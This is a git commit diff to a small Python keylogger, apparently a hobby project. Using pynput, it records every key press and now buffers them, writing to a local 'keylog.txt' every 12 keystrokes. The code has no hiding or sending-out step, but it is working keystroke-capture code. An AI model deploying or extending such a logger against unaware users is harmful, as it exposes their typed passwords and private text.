562a64176e22555b70805c20fcb1683c07c33f43
Shourya Shukla <periperidip@gmail.com>
2021-07-12 23:52:36 +0530

    main: wrap file handling in the function 'write_to_file()'
    Wrap file handling in the 'write_to_file()' function so that file
    reading and writing does not need to be done after every character. The
    variable 'MAX_COUNT' defines the number of characters after which file
    read and write is done.
    
    Signed-off-by: Shourya Shukla <periperidip@gmail.com>

--- main.py
+++ main.py
@@ -1,15 +1,28 @@
 from pynput.keyboard import Key, Listener
 
-keylog = open("keylog.txt", "a")
+keys = []
+char_count = 0
+
+def write_to_file(keys_pressed):
+	with open("keylog.txt", "a") as keylog:
+		for key in keys_pressed:
+			keylog.write(str(key))
+	keylog.close()
 
 def key_press(key):
-	global keylog
-	keylog.write(str(key))
+	global keys, char_count
+	MAX_COUNT = 12
+
+	keys.append(key)
+	char_count += 1
+
+	if char_count >= MAX_COUNT:
+		write_to_file(keys)
+		char_count = 0
+		keys = []
 
 def key_release(key):
-	global keylog
 	if key == Key.esc:
-		keylog.close()
 		return False
 
 with Listener(on_press = key_press, on_release = key_release) as listener:
